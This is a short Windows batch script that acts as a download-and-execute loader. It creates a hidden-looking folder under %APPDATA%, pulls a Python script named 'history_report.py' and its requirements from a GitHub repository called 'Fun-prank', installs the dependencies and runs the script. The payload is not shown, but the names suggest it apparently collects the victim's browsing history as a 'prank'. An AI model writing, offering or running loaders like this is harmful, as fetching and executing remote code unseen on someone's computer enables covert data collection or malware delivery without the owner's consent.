@echo off
echo Downloading Python script...

:: Ensure the history directory exists
mkdir "%APPDATA%\history"

:: Download the history_report.py script from a URL (replace with actual URL)
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Rma2212/Fun-prank/main/history_report.py' -OutFile '%APPDATA%\history\history_report.py'"

:: Check if the file exists after downloading
if exist "%APPDATA%\history\history_report.py" (
    echo File downloaded successfully.
) else (
    echo Failed to download the file. Exiting...
    pause
    exit /b
)

:: Download the requirements.txt file (if needed)
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Rma2212/Fun-prank/main/requirements.txt' -OutFile '%APPDATA%\history\requirements.txt'"

:: Check if the requirements.txt file exists
if exist "%APPDATA%\history\requirements.txt" (
    echo Requirements file downloaded successfully.
) else (
    echo Failed to download requirements.txt. Exiting...
    pause
    exit /b
)

:: Install required Python libraries
echo Installing required libraries...
pip install -r "%APPDATA%\history\requirements.txt"

:: Run the Python script
echo Running the Python script...
python "%APPDATA%\history\history_report.py"

:: Wait for any key before closing
pause
